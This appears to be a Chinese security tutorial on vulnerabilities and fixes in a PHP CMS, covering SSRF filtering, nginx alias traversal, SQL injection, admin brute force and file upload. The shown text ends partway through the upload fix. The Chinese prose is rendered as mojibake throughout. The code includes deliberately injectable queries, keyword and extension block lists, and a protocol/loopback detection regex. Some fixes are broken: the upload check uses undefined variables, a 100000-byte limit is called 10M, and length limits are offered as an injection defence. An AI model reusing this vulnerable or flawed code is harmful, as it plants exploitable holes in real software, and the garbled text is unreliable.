é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ï¼Œ80,443,8080,8090 ä¸‹é¢æ˜¯è‡ªå·±ç¼–å†™çš„WAF $url = &quot;http://baidu.com/test&quot;; if(preg_match(&quot;/file|ftp|tftp|gopher|dict|localhost|127\\.0\\.0\\.1|3232235521|2130706433|0x|0177\\.0\\.0\\.01|0\\.0\\.0\\.0|xip|@/i&quot;,$url))&#123; return $this-&gt;error(&quot;you are a hacker!!!&quot;); &#125; è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¦ç”¨ä¸Šé¢çš„æ­£åˆ™è¿‡æ»¤url file|ftp|tftp|gopher|dict æ˜¯è®©æ”¹urlåªèƒ½ä½¿ç”¨http/httpsåè®®ï¼Œè¿™æ ·å¯ä»¥é¿å…å¤§éƒ¨åˆ†çš„æ”»å‡»ã€‚ localhost|127.0.0.1 æ˜¯ä¸ºäº†é˜²æ­¢æ”»å‡»è€…æ¢æµ‹å†…ç½‘ç«¯å£ï¼Œä»¥å…æ³„éœ²ä¸€äº›å®¹æ˜“è¢«æ”»å‡»çš„åº”ç”¨ç¨‹åº 3232235521|2130706433|0x|0177.0.0.01|0.0.0.0 è¿™å‡ ä¸ªæ˜¯ä¸ºäº†é˜²æ­¢æ”»å‡»è€…å¯¹127.0.0.1è¿›è¡Œå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ï¼Œåè¿›åˆ¶çš„è½¬ç ï¼Œä»è€Œç»•è¿‡ä¹‹å‰çš„æ£€æµ‹ xip|@ è¿™ä¸¤ä¸ªæ˜¯é˜²æ­¢æ”»å‡»è€…ä½¿ç”¨302è·³è½¬æ”»å‡» 4.ç›®å½•éå†æ¼æ´åˆ†ænginx.conf location /files &#123; autoindex on; alias /var/www/public/uploads/; &#125; filesåå°‘å†™ä¸€ä¸ª/ è¾“å…¥urlhttp://192.168.164.147/files../æ—¶ï¼Œç›¸å½“äºè®¿é—®çš„æ˜¯/var/www/public/uploads/../ï¼Œæ‰€ä»¥è®¿é—®çš„å°±æ˜¯/var/www/public/ç›®å½•ã€‚ æ¼æ´é˜²å¾¡è¯¥æ¼æ´ä¿®å¤æ–¹æ³•å¾ˆç®€å• ä¿®æ”¹nginx.conf location /files/ &#123; autoindex on; alias /var/www/public/uploads/; &#125;5.SQLæ³¨å…¥æ¼æ´ç‚¹ä¸€ä»£ç åˆ†æä»£ç ä½ç½®application\\change\\controller\\Changepass.php public function index() &#123; if($this-&gt;request-&gt;isPost()) &#123; $account = $_POST[&#x27;account&#x27;]; $password = $_POST[&#x27;password&#x27;]; $npassword = $_POST[&#x27;npassword&#x27;]; $newpassword = $_POST[&#x27;newpassword&#x27;]; if($account != &#x27;&#x27; &amp;&amp; $password != &#x27;&#x27; &amp;&amp; $npassword != &#x27;&#x27; &amp;&amp; $newpassword !=&#x27;&#x27;)&#123; if($npassword === $newpassword) &#123; $result = Db::query(&quot;select `username` from yzn_member where username=&#x27;$account&#x27;&quot;); if (!empty($result)) &#123; $sql = Db::query(&quot;select `password`,`encrypt` from yzn_member where username=&#x27;$account&#x27;&quot;); $encrypt = $sql[0][&#x27;encrypt&#x27;]; $encrypt_password = $password . $encrypt; if ($sql[0][&#x27;password&#x27;] === md5($encrypt_password)) &#123; $pwd = md5($newpassword.$encrypt); $change = Db::query(&quot;UPDATE `yzn_member` SET `password`=&#x27;$pwd&#x27; WHERE username=&#x27;$account&#x27;&quot;); return $this-&gt;success(&quot;successful!&quot;); &#125; else &#123; return $this-&gt;error(&quot;wrong password!&quot;); &#125; &#125; else &#123; return $this-&gt;error(&quot;no user!&quot;); &#125; &#125; else&#123; return $this-&gt;error(&quot;new password are different!&quot;); &#125; &#125;else&#123; return $this-&gt;error(&quot;please input content!!!&quot;); &#125; &#125; è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯ï¼Œå…ˆæ£€æŸ¥ç”¨æˆ·çš„è¾“å…¥æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™åˆ¤æ–­ä¸¤æ¬¡è¾“å…¥çš„æ–°å¯†ç æ˜¯å¦ä¸€æ ·ï¼Œä¸€æ ·å…ˆåˆ°æ•°æ®åº“ä¸­æŸ¥æ‰¾è¯¥ç”¨æˆ·ï¼Œå¦‚æœæœ‰è¯¥ç”¨æˆ·ï¼Œåˆ™å–å‡ºè¯¥ç”¨æˆ·çš„å¯†ç å’ŒåŠ å¯†å› å­ï¼Œç„¶ååˆ¤æ–­æ—§å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®åˆ™å°†æ–°å¯†ç å’ŒåŠ å¯†å› å­çš„md5å€¼å†™å…¥æ•°æ®åº“ï¼Œå¯†ç ä¿®æ”¹æˆåŠŸã€‚ è¿™é‡Œå¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰è¿”å›æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œæ‰€ä»¥æ”»å‡»æ ¹æ®é”™è¯¯æç¤ºè¿›è¡Œç›²æ³¨æ”»å‡»ã€‚ æ¼æ´é˜²å¾¡ æ–¹æ³•ä¸€ å¯¹sqlæ³¨å…¥ä½¿ç”¨çš„å…³é”®è¯è¿›è¡Œè¿‡æ»¤ï¼Œå†™ä¸€ä¸ªwafå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œæ£€æŸ¥ è¿™é‡Œçš„è¯åªéœ€è¦å¯¹ç”¨æˆ·åè¿›è¡Œè¿‡æ»¤ï¼Œå› ä¸ºåªæœ‰ç”¨æˆ·åè¢«å¸¦å…¥åˆ°sqlè¯­å¥ä¸­è¿›è¡ŒæŸ¥è¯¢ function inject_check($Sql_Str) &#123;//æ£€æµ‹Sqlçš„æ³¨å…¥è¯­å¥ã€‚ $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; return $this-&gt;error(&quot;hacker!!!&quot;) &#125;else&#123; return $Sql_Str; &#125; &#125; å¯ä»¥çœ‹åˆ°ä½¿ç”¨bpè¿›è¡Œæ³¨å…¥fuzzingï¼Œå¯ä»¥å‘ç°å¾ˆå¤špayloadéƒ½å·²ç»è¢«è¿‡æ»¤ æ–¹æ³•äºŒ ç¬¬ä¸€ç§æ–¹æ³•å¾ˆç®€å•ï¼Œå°±æ˜¯é™åˆ¶ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦ï¼Œç„¶åå¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œé•¿åº¦é™åˆ¶ å› ä¸ºæ˜¯ç”¨æˆ·åå’Œå¯†ç ä½ç½®ï¼Œç”¨æˆ·åçš„é•¿åº¦ä¸€èˆ¬ä¸ä¼šè¶…è¿‡20ä¸ªå­—ç¬¦ï¼Œå¯†ç ä¹Ÿä¸ä¼šè¶…è¿‡20ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆè¿™é‡Œåªéœ€è¦åœ¨ç”¨æˆ·æäº¤å®Œæ•°æ®åï¼Œåœ¨åç«¯æ£€æµ‹ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦ï¼Œè¿™æ ·å°±å¯ä»¥è®©sqlæ³¨å…¥æ”»å‡»æ— æ³•å‘æŒ¥å¨åŠ›ï¼Œå› ä¸ºåœ¨20ä¸ªå­—ç¬¦èŒƒå›´ä¹‹å†…å¾ˆéš¾æ„é€ å‡ºæœ‰æ•ˆçš„æ”»å‡»è¯­å¥ã€‚ æ¼æ´ç‚¹äºŒä»£ç åˆ†æpublic function jifen()&#123; $msg = &quot;&quot;; $point=0; $id = $this-&gt;userid; $sql = Db::query(&quot;select `point` from yzn_member where id=&#x27;$id&#x27;&quot;)[0]; $point = (int)$sql[&#x27;point&#x27;]; if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]!==&#x27;&#x27;)&#123; $username = $_POST[&#x27;username&#x27;]; $num = (int)$_POST[&#x27;num&#x27;]; if($username !== $this-&gt;userinfo[&#x27;username&#x27;] &amp;&amp; $num &lt;= $point)&#123; $result = Db::query(&quot;select `point` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; if(!empty($result))&#123; $new_point = (int)$result[&#x27;point&#x27;] + $num; $point = $point - $num; Db::query(&quot;UPDATE `yzn_member` SET `point`=&#x27;$point&#x27; WHERE id=&#x27;$id&#x27;&quot;); Db::query(&quot;UPDATE `yzn_member` SET `point`=&#x27;$new_point&#x27; WHERE username=&#x27;$username&#x27;&quot;); $msg = &quot;æˆåŠŸå‘&quot;.$username.&quot;èµ é€&quot;.(string)$num.&quot;ç§¯åˆ†!&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125;else&#123; $msg = &quot;ä¸å­˜åœ¨è¯¥ç”¨æˆ·ï¼&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125; &#125;else&#123; $msg = &quot;æ³¨æ„ç”¨æˆ·åä¸èƒ½æ˜¯è‡ªå·±ä¸”ç§¯åˆ†æ•°ç‚¹æ•°éœ€è¦å°äºè‡ªå·±å½“å‰ç§¯åˆ†!&quot;; return $this-&gt;fetch(&#x27;/jifen&#x27;,[&#x27;point&#x27;=&gt;$point,&#x27;msg&#x27;=&gt;$msg]); &#125; &#125; åœ¨è¿™æ®µä»£ç ä¸­ä¼šå°†ç”¨æˆ·æäº¤çš„ç”¨æˆ·åå¸¦åˆ°sqlè¯­å¥ä¸­æŸ¥è¯¢ $result = Db::query(&quot;select `point` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; è™½ç„¶æ­¤å¤„æ²¡æœ‰è¿”å›å€¼ï¼Œä½†æ˜¯å¦‚æœæŸ¥è¯¢å¤±è´¥å°±ä¼šæç¤º$msg=&quot;ä¸å­˜åœ¨è¯¥ç”¨æˆ·ï¼&quot;ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç›²æ³¨æ”»å‡» æ¼æ´é˜²å¾¡åŒæ ·å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸Šé¢çš„è¿‡æ»¤å‡½æ•° æ¼æ´ç‚¹ä¸‰ä»£ç åˆ†æapplication\\member\\controller\\Index.phpä¸­çš„finduseræ–¹æ³• public function finduser()&#123; $msg = &#x27;&#x27;; $email = &#x27;&#x27;; if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]!==&#x27;&#x27;)&#123; $username = $_POST[&#x27;username&#x27;]; $deny_str = array(&#x27; &#x27;,&#x27;union&#x27;,&#x27;select&#x27;,&#x27;from&#x27;,&#x27;or&#x27;,&#x27;and&#x27;); $username = str_ireplace($deny_str,&#x27;&#x27;,$username); $result = Db::query(&quot;select `email` from yzn_member where username=&#x27;$username&#x27;&quot;)[0]; if (!empty($result))&#123; $email = $result[&#x27;email&#x27;]; $msg = &#x27;æŸ¥è¯¢æˆåŠŸ! &#x27;.$username.&#x27;çš„é‚®ç®±æ˜¯:&#x27;; return $this-&gt;fetch(&#x27;/finduser&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;username&#x27;=&gt;$username,&#x27;email&#x27;=&gt;$email]); &#125;else&#123; $msg = &#x27;æŸ¥è¯¢å¤±è´¥ï¼Œ&#x27;.$username.&#x27;ä¸å­˜åœ¨,è¯·æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦æ­£ç¡®!&#x27;; return $this-&gt;fetch(&#x27;/finduser&#x27;,[&#x27;msg&#x27;=&gt;$msg]); &#125; &#125; return $this-&gt;fetch(&#x27;/finduser&#x27;); &#125; å¯ä»¥çœ‹åˆ°ï¼Œå¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯è¿‡æ»¤çš„å†…å®¹å¾ˆå°‘ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å°±è¢«ç»•è¿‡ æ¼æ´é˜²å¾¡è¿™é‡Œçš„é˜²å¾¡å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸Šé¢è¿‡æ»¤å‡½æ•° æ¼æ´ç‚¹å››ä»£ç ä½ç½®application\\member\\controller\\Content.php ä»£ç åˆ†æ$id = $this-&gt;request-&gt;param(&#x27;id&#x27;, 0); $info = Db::query(&#x27;SELECT * FROM `yzn_member_content` WHERE `uid` = &#x27;.$this-&gt;userid.&#x27; AND `id` = &#x27;.$id.&#x27; LIMIT 1&#x27;)[0]; if (empty($info)) &#123; $this-&gt;error(&#x27;ç¨¿ä»¶ä¸å­˜åœ¨ï¼&#x27;); &#125; è¿™é‡Œç›´æ¥å°†ç”¨æˆ·æäº¤çš„æ•°æ®idï¼Œå¸¦å…¥åˆ°sqlè¯­å¥ä¸­æŸ¥è¯¢ï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ æ¼æ´é˜²å¾¡æ–¹æ³•ä¸€ å› ä¸ºidæ˜¯ä¸€ä¸ªæ•°å­—ï¼Œé‚£ä¹ˆç›´æ¥å¯¹idè¿™ä¸ªå‚æ•°è¿›è¡Œé™åˆ¶ï¼Œåªå…è®¸ç”¨æˆ·æäº¤æ•°å­—å‹æ•°æ® if(!is_numeric($id))&#123; return $this-&gt;error(&quot;idå¿…é¡»æ˜¯æ•°å­—ï¼&quot;) &#125; æ–¹æ³•äºŒ ä¸ä¸Šé¢çš„æ–¹æ³•äºŒä¸€æ ·ï¼Œå¯¹idå‚æ•°è¿›è¡Œè¿‡æ»¤ 6.æš´åŠ›ç ´è§£ä»£ç åˆ†æè¯¥æ¼æ´å­˜åœ¨äºç®¡ç†å‘˜åå°ç™»å½•ï¼Œé€ æˆè¯¥æ¼æ´çš„åŸå› å¤§å¤šæ˜¯å› ä¸ºç®¡ç†äººå‘˜æ²¡æœ‰ä¿®æ”¹åˆå§‹å¯†ç ï¼Œæˆ–è€…å¿ƒå­˜ä¾¥å¹¸æ”¹æˆäº†æ¯”è¾ƒå¸¸è§çš„å¯†ç ï¼Œè¿™æ ·å°±ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œç›´æ¥ä½¿ç”¨æš´åŠ›ç ´è§£å°±å¯ä»¥æ”»å…‹åå°ç®¡ç†é¡µé¢ã€‚ ä»£ç ä½äºapplication\\admin\\controller\\Index.phpä¸­çš„login()æ–¹æ³• //ç™»å½•åˆ¤æ–­ public function login() &#123; $url = $this-&gt;request-&gt;get(&#x27;url&#x27;, &#x27;index/index&#x27;); if (User::instance()-&gt;isLogin()) &#123; $this-&gt;redirect(&#x27;admin/index/index&#x27;); &#125; if ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(); $keeplogin = $this-&gt;request-&gt;post(&#x27;keeplogin&#x27;); // å¯¹æäº¤æ•°æ®è¿›è¡Œæ£€æŸ¥ $rule = [ &#x27;username|ç”¨æˆ·å&#x27; =&gt; &#x27;require|alphaDash|length:3,20&#x27;, &#x27;password|å¯†ç &#x27; =&gt; &#x27;require|length:3,20&#x27;, &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; $result = $this-&gt;validate($data, $rule); if (true !== $result) &#123; $this-&gt;error($result, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; if (User::instance()-&gt;login($data[&#x27;username&#x27;], $data[&#x27;password&#x27;], $keeplogin ? 86400 : 0)) &#123; $this-&gt;success(&#x27;æ­å–œæ‚¨ï¼Œç™»é™†æˆåŠŸ&#x27;, url(&#x27;admin/Index/index&#x27;)); &#125; else &#123; $msg = User::instance()-&gt;getError(); $msg = $msg ? $msg : &#x27;ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯!&#x27;; $this-&gt;error($msg, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; &#125; else &#123; if (User::instance()-&gt;autologin()) &#123; $this-&gt;redirect(&#x27;admin/index/index&#x27;); &#125; return $this-&gt;fetch(); &#125; &#125; è™½ç„¶æ¯æ¬¡ç™»å½•éƒ½éœ€è¦å¸¦æœ‰tokenï¼Œä½†æ˜¯ä¹Ÿæ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸ºtokençš„å€¼æ˜¯å¯ä»¥ä»å‰ç«¯é¡µé¢è·å–çš„ æ¼æ´é˜²å¾¡é˜²å¾¡æ–¹æ³•å°±æ˜¯é™åˆ¶ç®¡ç†å‘˜ç™»å½•æ—¶å¯†ç è¾“å…¥çš„é”™è¯¯æ¬¡æ•°ï¼Œå½“é”™è¯¯æ¬¡æ•°è¾¾åˆ°ä¸€å®šæ•°é‡æ—¶ï¼Œå°±é”å®šè¯¥è´¦å·ï¼Œéœ€è¦æ‹¥æœ‰æ•°æ®åº“ç®¡ç†æƒé™çš„çœŸæ­£ç®¡ç†å‘˜æ‰èƒ½é‡æ–°ç™»å½•ã€‚ é¦–å…ˆåœ¨æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè¡¨yzn_loginfoï¼Œé‡Œé¢åªéœ€è¦ä¸€ä¸ªå­—æ®µï¼Œç”¨æ¥è®°å½•adminè´¦å·è¿ç»­è¾“å…¥é”™è¯¯å¯†ç çš„æ¬¡æ•°ã€‚ å…·ä½“æ–¹æ³•ä¸º é¦–å…ˆè¿›å…¥mysqlå®¹å™¨å†…éƒ¨ docker exec -it ed1c19bb4a95 bash ä¹‹åç™»å½•rootè´¦å·ï¼Œåœ¨æ•°æ®åº“ä¸­å»ºç«‹ä¸€å¼ è¡¨ CREATE TABLE IF NOT EXISTS `yzn_loginfo` ( `login_fail` int(10) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8; ä¿®æ”¹ä»£ç application\\admin\\controller\\Index.phpä¸­çš„login()æ–¹æ³• å…¶ä¸­æˆ´// æ˜¯å¢åŠ çš„ä»£ç  // ä»yzn_loginfoè¡¨ä¸­è·å–åˆ° login_failçš„å€¼ $login_fail = Db::query(&#x27;SELECT * FROM `yzn_loginfo`&#x27;)[0]; // $login_fail_count = $login_fail[&#x27;login_fail&#x27;]; // // å¦‚æœå¯†ç é”™è¯¯è¶…è¿‡ 5 åˆ™é”å®šè´¦å· if($login_fail_count &gt;= 5)&#123; // $msg = &quot;è´¦å·è¢«é”å®šï¼Œè¯·è”ç³»ç½‘ç«™ç®¡ç†å‘˜ï¼&quot;; // $this-&gt;error($msg,$url); // &#125; if (User::instance()-&gt;login($data[&#x27;username&#x27;], $data[&#x27;password&#x27;], $keeplogin ? 86400 : 0)) &#123; // å¦‚æœè¾“å…¥çš„å¯†ç æ­£ç¡®ï¼Œè¯´æ˜æ˜¯çœŸæ­£çš„adminï¼Œå°†login_failå€¼æ›´æ–°ä¸º0 Db::query(&#x27;UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`=&#x27;.$login_fail_count); // $this-&gt;success(&#x27;æ­å–œæ‚¨ï¼Œç™»é™†æˆåŠŸ&#x27;, url(&#x27;admin/Index/index&#x27;)); &#125; else &#123; $msg = User::instance()-&gt;getError(); $msg = $msg ? $msg : &#x27;ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯!&#x27;; // å¦‚æœè¾“å…¥çš„å¯†ç ä¸æ­£ç¡®ï¼Œåˆ™å°†login_failçš„å€¼+1åå†åˆ°æ•°æ®åº“ä¸­æ›´æ–° $login_fail_count_new = $login_fail_count + 1; // Db::query(&#x27;UPDATE `yzn_loginfo` SET `login_fail`= &#x27;.$login_fail_count_new.&#x27; WHERE `login_fail`=&#x27;.$login_fail_count); // $this-&gt;error($msg, $url, [&#x27;token&#x27; =&gt; $this-&gt;request-&gt;token()]); &#125; å½“è¿ç»­è¾“é”™äº”æ¬¡å¯†ç æ—¶ï¼Œè´¦å·å°±è¢«é”å®šï¼Œæ­¤æ—¶æ²¡æœ‰ä»»ä½•äººèƒ½å¤Ÿç™»å½•ï¼Œå¿…é¡»åˆ°æ•°æ®åº“ä¸­éœ€æ”¹yzn_loginfoçš„login_failçš„å€¼ï¼Œè¿™ä¹Ÿå°±è¾¾åˆ°äº†é˜²æ­¢æš´åŠ›ç ´è§£çš„æ”»å‡»ã€‚ å³æ‰§è¡Œä¸‹é¢è¿™ä¸ªsqlè¯­å¥ UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`= 5; 7.æ–‡ä»¶ä¸Šä¼ æ¼æ´ç‚¹ä¸€ä»£ç åˆ†æapplication\\member\\controller\\Index.php ä¸­çš„photoæ–¹æ³• public function photo()&#123; $msg = &#x27;&#x27;; $path = &quot;./uploads/images/photo&quot;; define(&quot;UPLOAD_PATH&quot;,&quot;../public/uploads/images/photo&quot;); if (isset($_POST[&#x27;submit&#x27;]))&#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $path.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &#x27;ä¸Šä¼ æˆåŠŸï¼&#x27;; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = $path . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; echo $msg; &#125; &#125; return $this-&gt;fetch(&#x27;/photo&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;path&#x27;=&gt;$img_path]); &#125; å¯ä»¥çœ‹åˆ°ä¸Šé¢æ˜¯ä½¿ç”¨é»‘åå•ï¼Œå¯¹å«æœ‰é»‘åå•åç¼€çš„æ–‡ä»¶è¿›è¡Œæ›¿æ¢ï¼Œæ˜¾ç¤ºè¿™æ ·æ˜¯å¾ˆä¸å®‰å…¨çš„ï¼Œä½¿ç”¨åŒå†™å³å¯ç»•è¿‡ï¼Œé€ æˆäº†æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´é˜²å¾¡ public function photo()&#123; $msg = &#x27;&#x27;; $path = &quot;./uploads/images/photo&quot;; define(&quot;UPLOAD_PATH&quot;,&quot;../public/uploads/images/photo&quot;); if (isset($_POST[&#x27;submit&#x27;]))&#123; if (file_exists(UPLOAD_PATH)) &#123; $uploaded_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $uploaded_size = $_FILES[ &#x27;upload_file&#x27; ][ &#x27;size&#x27; ]; $uploaded_type = $_FILES[ &#x27;upload_file&#x27; ][ &#x27;type&#x27; ]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; //æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¿®å¤ $img_path = $path.&#x27;/&#x27;.$uploaded_name; if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;gif&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) &amp;&amp; ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27;|| $uploaded_type == &#x27;image/gif&#x27; ) ) &#123; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &#x27;ä¸Šä¼ æˆåŠŸï¼&#x27;; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125;else&#123; $this-&gt;error(&quot;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®&quot;) &#125; &#125; else &#123; $msg = $path . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; echo $msg; &#125; &#125; return $this-&gt;fetch(&#x27;/photo&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;path&#x27;=&gt;$img_path]); &#125; å…¶ä¸­ifä¸­çš„æ¡ä»¶å¦‚ä¸‹ ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;gif&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) ä¿è¯æ–‡ä»¶åç¼€ååªèƒ½æ˜¯jpg gif pngçš„ä¸€ä¸ª ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39;|| $uploaded_type == &#39;image/gif&#39; ) æ–‡ä»¶çš„MIMEå¿…é¡»ä¸ºä¸‰è€…ä¸­çš„ä¸€ä¸ª ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) è¿™æ˜¯ä¿è¯æ–‡ä»¶çš„å¤§å°å°10Mï¼Œå¹¶ä¸”æ–‡ä»¶ä¸èƒ½ç©º æ¼æ´ç‚¹äºŒä»£ç åˆ†ææ”¹ä»£ç ä½äºapplication\\attachment\\controller\\Upload.phpä¸­çš„saveFileæ–¹æ³• if ($size_limit &gt; 0 &amp;&amp; ($file-&gt;getInfo(&#x27;size&#x27;) &gt; $size_limit)) &#123; return json([ &#x27;status&#x27; =&gt; 0, &#x27;info&#x27; =&gt; &#x27;é™„ä»¶è¿‡å¤§&#x27;, &#x27;state&#x27; =&gt; &#x27;é™„ä»¶è¿‡å¤§&#x27;, //å…¼å®¹ç™¾åº¦ &#x27;message&#x27; =&gt; &#x27;é™„ä»¶è¿‡å¤§&#x27;, //å…¼å®¹editormd ]); &#125; // åˆ¤æ–­é™„ä»¶æ ¼å¼æ˜¯å¦ç¬¦åˆ $file_name = $file-&gt;getInfo(&#x27;name&#x27;); $error_msg = &#x27;&#x27;; if ($error_msg != &#x27;&#x27;) &#123; return json([ &#x27;code&#x27; =&gt; -1, &#x27;info&#x27; =&gt; $error_msg, &#x27;state&#x27; =&gt; $error_msg, //å…¼å®¹ç™¾åº¦ &#x27;message&#x27; =&gt; $error_msg, //å…¼å®¹editormd ]); &#125; å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç ä¸­åªæ˜¯å¯¹ä¸Šä¼ é™„ä»¶çš„å¤§å°è¿›è¡Œäº†æ£€æŸ¥ï¼Œè€Œæ²¡æœ‰å¯¹æ–‡ä»¶çš„åç¼€å’Œæ–‡ä»¶çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼Œè¿™æ ·æ”»å‡»è€…å°±å¯ä»¥ä»»æ„çš„ä¸Šä¼ æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå±å®³è¿˜æ˜¯å¾ˆå¤§çš„ã€‚ æ¼æ´é˜²å¾¡æ–¹æ³•ä¸€ å¯¹äºå…¶çš„é˜²å¾¡æ–¹æ³•å°±æ˜¯è·å–æ–‡ä»¶çš„ç±»å‹ç„¶åæ£€æŸ¥å…¶æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚è¿™é‡Œåªå…è®¸ä¸Šä¼ png,jpg,jpeg,gif,bmpç±»å‹çš„æ–‡ä»¶ $file_ext = strtolower(substr($file_name, strrpos($file_name, &#x27;.&#x27;) + 1));//è·å–æ–‡ä»¶çš„åç¼€å // è·å–æ–‡ä»¶çš„MiME,æ³¨æ„è¿™é‡Œä¸æ˜¯ä»å®¢æˆ·ç«¯çš„è¯·æ±‚å¤´ä¸­è·å–çš„ï¼Œè€Œæ˜¯æ ¹æ®æ–‡ä»¶çš„åç¼€åä»phpå‡½æ•°ä¸­è·å–ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢æ”»å‡»è€…ä¿®æ”¹MIMEè¿›è¡Œæ¬ºéª— try &#123; $fileMine = $file-&gt;getMime(); &#125; catch (\\Exception $ex) &#123; $error_msg = $ex-&gt;getMessage(); &#125; // ç¦æ­¢MIMEä¸ºtext/x-phpæˆ–text/html if ($fileMine == &#x27;text/x-php&#x27; || $fileMine == &#x27;text/html&#x27;) &#123; $error_msg = &#x27;ç¦æ­¢ä¸Šä¼ éæ³•æ–‡ä»¶ï¼&#x27;; &#125; //ç¦æ­¢åç¼€åä¸ºphpçš„ if (preg_grep(&quot;/php/i&quot;, $ext_limit)) &#123; $error_msg = &#x27;ç¦æ­¢ä¸Šä¼ éæ³•æ–‡ä»¶ï¼&#x27;; &#125; // ç¦æ­¢ä¸Šä¼ æ–‡ä»¶ååç¼€ååœ¨$ext_limitä¸­çš„ if (!preg_grep(&quot;/$file_ext/i&quot;, $ext_limit)) &#123; $error_msg = 